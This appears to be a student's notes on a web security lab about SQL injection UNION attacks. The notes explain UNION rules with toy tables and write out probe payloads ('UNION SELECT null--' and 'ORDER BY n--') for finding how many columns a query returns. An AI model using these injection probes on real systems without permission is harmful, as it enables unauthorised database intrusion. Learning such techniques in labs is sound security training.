Lab #3: SQL injection UNION attack, determining the number of columns returned by the query

    Target Goal:
         Determine the number of columns returned by the query

    Analysis:

         table1         table2   
         a | b          c | d
         -----          ------ 
         1 , 2          2 , 3 
         3 , 4          4 , 5

         query #1: select a, b from table1 
         1 , 2
         3 , 4

         query #2: select a, b from table1 UNION select c, d from table2 
         1 , 2
         3 , 4
         2 , 3 
         4 , 5     
         
         Rule: 
            1. The number and the order of the columns must be the same in all queries
            2. The data must be compatible  
        
        Type1:
         SELECT * FROM table1 UNION SELECT null--  (if error -> incorrect number of columns)
         select * FROM table1 UNION SELECT null, null-- (if 200 response -> correct number of columns)
        
        Type2:
          select * FROM table order by 1-- (if not error -> column exists in table1)
          select * FROM table order by 2--(if error -> column does not exist in table1)
